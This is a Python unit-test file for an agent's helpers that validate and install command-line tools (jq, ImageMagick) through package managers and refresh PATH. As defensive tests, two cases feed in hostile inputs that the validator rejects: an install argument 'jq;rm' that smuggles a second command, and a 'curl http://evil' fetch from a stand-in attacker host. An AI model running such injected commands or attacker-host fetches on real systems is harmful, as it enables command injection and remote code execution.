"""Unit tests for host CLI check/install helpers."""

from __future__ import annotations

import os
from unittest.mock import MagicMock

import pytest

from api.app.agent.cli_host import (
    CliHostError,
    check_cli_installed,
    command_from_config,
    has_install_spec,
    install_cli_tool,
    refresh_process_path,
    resolve_install_argv,
)


def test_command_from_config_ok():
    assert command_from_config({"command": "jq"}) == "jq"


def test_command_from_config_rejects_path():
    with pytest.raises(CliHostError) as exc:
        command_from_config({"command": "/usr/bin/jq"})
    assert exc.value.code == "invalid_command"


def test_has_install_spec():
    assert has_install_spec({"command": "jq", "install": ["brew", "install", "jq"]})
    assert has_install_spec({"command": "jq", "install_command": "brew install jq"})
    assert not has_install_spec({"command": "jq"})


def test_resolve_install_argv_from_list():
    argv = resolve_install_argv({"command": "jq", "install": ["brew", "install", "jq"]})
    assert argv == ["brew", "install", "jq"]


def test_resolve_install_argv_platform_dict(monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr("api.app.agent.cli_host.host_platform", lambda: "darwin")
    argv = resolve_install_argv(
        {
            "command": "jq",
            "install": {
                "darwin": ["brew", "install", "jq"],
                "windows": ["winget", "install", "-e", "--id", "jqlang.jq"],
            },
        }
    )
    assert argv == ["brew", "install", "jq"]


def test_resolve_install_argv_rejects_shell():
    with pytest.raises(CliHostError) as exc:
        resolve_install_argv({"command": "jq", "install": ["brew", "install", "jq;rm"]})
    assert exc.value.code == "invalid_install"


def test_resolve_install_argv_rejects_unknown_installer():
    with pytest.raises(CliHostError) as exc:
        resolve_install_argv({"command": "jq", "install": ["curl", "http://evil"]})
    assert exc.value.code == "installer_not_allowed"


def test_check_cli_installed(monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr("api.app.agent.cli_host.shutil.which", lambda c: f"/bin/{c}")
    result = check_cli_installed(tool_name="jq-tool", config={"command": "jq"})
    assert result.installed is True
    assert result.resolved_path == "/bin/jq"
    assert result.command == "jq"


def test_install_skips_when_already_present(monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr("api.app.agent.cli_host.shutil.which", lambda c: f"/usr/bin/{c}")
    result = install_cli_tool(
        tool_name="jq",
        config={"command": "jq", "install": ["brew", "install", "jq"]},
        timeout_seconds=30,
        max_output_bytes=1000,
    )
    assert result.ok is True
    assert result.installed is True
    assert result.install_cmd == []


def test_install_runs_subprocess(monkeypatch: pytest.MonkeyPatch):
    paths = {"jq": None}

    def fake_which(cmd: str):
        return paths.get(cmd)

    def fake_run(argv, **kwargs):
        paths["jq"] = "/usr/local/bin/jq"
        return MagicMock(returncode=0, stdout="ok", stderr="")

    monkeypatch.setattr("api.app.agent.cli_host.shutil.which", fake_which)
    monkeypatch.setattr("api.app.agent.cli_host.subprocess.run", fake_run)
    monkeypatch.setattr("api.app.agent.cli_host.host_platform", lambda: "darwin")
    monkeypatch.setattr("api.app.agent.cli_host.refresh_process_path", lambda **kwargs: "")

    result = install_cli_tool(
        tool_name="jq",
        config={"command": "jq", "install": ["brew", "install", "jq"]},
        timeout_seconds=30,
        max_output_bytes=1000,
    )
    assert result.ok is True
    assert result.installed is True
    assert result.install_cmd == ["brew", "install", "jq"]
    assert result.resolved_path == "/usr/local/bin/jq"


def test_refresh_process_path_windows_includes_common_bins(monkeypatch: pytest.MonkeyPatch, tmp_path):
    magick_dir = tmp_path / "ImageMagick-9.0"
    magick_dir.mkdir()
    monkeypatch.setattr("api.app.agent.cli_host.host_platform", lambda: "windows")
    monkeypatch.setattr("api.app.agent.cli_host._windows_registry_path", lambda: str(tmp_path / "reg-bin"))
    monkeypatch.setattr(
        "api.app.agent.cli_host._windows_common_bin_dirs",
        lambda: [str(magick_dir)],
    )
    monkeypatch.setenv("PATH", str(tmp_path / "old-bin"))

    new_path = refresh_process_path(include_login_shell=False)
    assert str(magick_dir) in new_path.split(os.pathsep)
    assert os.environ["PATH"] == new_path


def test_install_refreshes_path_when_which_lags(monkeypatch: pytest.MonkeyPatch):
    """Installer exit 0; binary only visible after PATH refresh (ImageMagick case)."""
    paths: dict[str, str | None] = {"magick": None}
    refreshed = {"done": False}

    def fake_which(cmd: str):
        return paths.get(cmd)

    def fake_run(argv, **kwargs):
        return MagicMock(returncode=0, stdout="installed", stderr="")

    def fake_refresh(**kwargs):
        refreshed["done"] = True
        paths["magick"] = r"C:\Program Files\ImageMagick\magick.exe"
        return os.environ.get("PATH", "")

    monkeypatch.setattr("api.app.agent.cli_host.shutil.which", fake_which)
    monkeypatch.setattr("api.app.agent.cli_host.subprocess.run", fake_run)
    monkeypatch.setattr("api.app.agent.cli_host.refresh_process_path", fake_refresh)
    monkeypatch.setattr("api.app.agent.cli_host.host_platform", lambda: "windows")

    result = install_cli_tool(
        tool_name="magick",
        config={"command": "magick", "install": "choco install imagemagick -y"},
        timeout_seconds=30,
        max_output_bytes=1000,
    )
    assert refreshed["done"] is True
    assert result.ok is True
    assert result.installed is True
    assert result.exit_code == 0
    assert result.resolved_path and "magick" in result.resolved_path.lower()
